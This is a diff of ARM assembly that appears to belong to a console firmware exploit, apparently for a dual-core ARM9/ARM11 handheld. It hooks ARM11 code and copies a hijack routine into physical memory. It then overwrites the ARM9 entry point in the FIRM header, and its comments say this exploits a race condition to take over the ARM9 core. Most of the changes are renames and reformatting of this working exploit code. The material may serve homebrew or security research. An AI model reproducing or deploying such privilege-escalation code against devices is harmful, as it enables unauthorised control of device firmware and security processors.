@@ -33,6 +33,12 @@ EnableInterrupts:
 .global arm9_start
 @ insert your funky stuff here
 arm9_start:
+	b skipvars
+
+	@ offs 4
+	pa_entrypoint_backup: .long 0
+	
+skipvars:
 	stmfd sp!, {r0-r12,lr}
 
 	@ delay execution. just for "fun"
@@ -50,11 +56,8 @@ inner:
 
 	ldmfd sp!, {r0-r12,lr}
 	
-	@ should we better save r8? :)
-	ldr r8, physical_addr_entrypoint_backup
-	ldr pc, [r8]
+	ldr pc, pa_entrypoint_backup
 	
-	physical_addr_entrypoint_backup: .long 0x23F00100
 	
 .global arm9_end
 arm9_end:
@@ -63,8 +66,8 @@ arm9_end:
 
 .global	arm11_start
 arm11_start:
-	b	hook1
-	b   hook2
+	b hook1
+	b hook2
 
 hook1:
 	stmfd sp!, {r0-r12,lr}
@@ -102,7 +105,7 @@ hook1:
 
 	ldr	r0, var_44836
 	str	r0, [r1]
-	ldr	pc, hook1_ret_addr
+	ldr	pc, va_hook1_ret
 
 	var_44836: .long 0x44836
 
@@ -110,7 +113,7 @@ hook1:
 hook2:
 	adr r0, hijack_arm9
 	adr r1, hijack_arm9_end
-	ldr r2, phys_addr_hijack_arm9_dst
+	ldr r2, pa_hijack_arm9_dst
 	mov r4, r2
 	bl copy_mem
 	bx r4
@@ -119,17 +122,17 @@ hook2:
 @ to take control over the arm9 core
 hijack_arm9:
 	@ init
-	ldr r0, phys_addr_arm11_code 
+	ldr r0, pa_arm11_code 
 	mov r1, #0 
 	str r1, [r0]
 	
 	@ load physical addresses
-	ldr r10, phys_addr_firm_ncch
-	ldr r9, phys_addr_arm9_payload
-	ldr r8, phys_addr_io_mem
+	ldr r10, pa_firm_ncch
+	ldr r9, pa_arm9_payload
+	ldr r8, pa_io_mem
 	
 	@ send pxi cmd 0x44846
-	ldr r1, phys_addr_pxi 
+	ldr r1, pa_pxi_regs 
 	ldr r2, some_pxi_cmd
 	str r2, [r1, #8]
 
@@ -141,27 +144,27 @@ wait_arm9_loop:
 	@ get arm9 orig entry point phys addr from FIRM header
 	ldr r0, [r10, #0x0C]
 
-	@ backup orig entry point to FCRAM
-	str r0, [r9, #0x100]
+	@ backup orig entry point to FCRAM + offset 4
+	str r0, [r9, #0x4]
 
 	@ overwrite orig entry point with FCRAM addr
 	@ this exploits the race condition bug
 	str	r9, [r10, #0x0C] 	
 
-	ldr r0, phys_addr_arm11_code
-wait_arm11_loop:                
-	ldr	r1, [R0]
+	ldr r0, pa_arm11_code
+wait_arm11_loop:
+	ldr	r1, [r0]
 	cmp r1, #0  
 	beq wait_arm11_loop
 	bx r1
 
-	phys_addr_hijack_arm9_dst:	.long 0x1FFFFC00
-	phys_addr_arm11_code:		.long 0x1FFFFFFC
-	phys_addr_pxi:				.long 0x10163000
-	some_pxi_cmd:				.long 0x44846
-	phys_addr_firm_ncch:		.long 0x24000000
-	phys_addr_arm9_payload:		.long 0x23F00000
-	phys_addr_io_mem:			.long 0x10140000
+	pa_hijack_arm9_dst:  .long 0x1FFFFC00
+	pa_arm11_code:       .long 0x1FFFFFFC
+	pa_pxi_regs:         .long 0x10163000
+	some_pxi_cmd:        .long 0x44846
+	pa_firm_ncch:        .long 0x24000000
+	pa_arm9_payload:     .long 0x23F00000
+	pa_io_mem:           .long 0x10140000
 	.align 4
 hijack_arm9_end:
 
@@ -200,7 +203,7 @@ busy_spin:
 
 pdn_send:
 	ldr r1, va_pdn_regs
-	strb r0, [r1,#0x230]
+	strb r0, [r1, #0x230]
 	bx lr
 	
 pxi_send:  
@@ -221,7 +224,7 @@ loc_1020FC:
 	LDR             R0, [R0,#0xC]
 	BX              LR
 
-pxi_sync:                                
+pxi_sync:
 	LDR             R0, va_pxi_regs
 	LDRB            R1, [R0,#3]
 	ORR             R1, R1, #0x40
@@ -271,10 +274,10 @@ arm11_end:
 .global arm11_globals_start
 arm11_globals_start:
 
-	va_pdn_regs: .long 0
-	va_pxi_regs: .long 0
-	hook1_ret_addr: .long 0
-	va_fb:	.long 0
+	va_pdn_regs:    .long 0
+	va_pxi_regs:    .long 0
+	va_hook1_ret:   .long 0
+	va_fb:          .long 0
 
 .global arm11_globals_end
 arm11_globals_end:
